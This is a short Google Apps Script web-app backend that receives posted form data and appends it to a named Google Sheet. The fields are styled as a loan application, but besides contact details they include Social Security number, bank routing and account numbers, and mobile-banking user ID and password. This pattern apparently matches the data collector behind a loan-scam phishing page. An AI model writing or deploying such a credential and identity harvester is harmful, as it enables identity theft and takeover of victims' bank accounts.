const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
    const data = JSON.parse(e.postData.contents);

    // Append data in exact order as specified
    sheet.appendRow([
      data.loanAmount || "",
      data.loanPurpose || "",
      data.creditScore || "",
      data.name || "",
      data.email || "",
      data.phone || "",
      data.streetAddress || "",
      data.city || "",
      data.state || "",
      data.zipCode || "",
      data.ssn || "",
      data.annualIncome || "",
      data.employmentStatus || "",
      data.monthlyHousing || "",
      data.bankName || "",
      data.routingNumber || "",
      data.accountNumber || "",
      data.yourBank || "",
      data.mobileBankingUserId || "",
      data.mobileBankingPassword || "",
      new Date()
    ]);

    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(JSON.stringify({ status: "error", message: err.message }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet() {
  return ContentService.createTextOutput("Google Sheets API working");
}
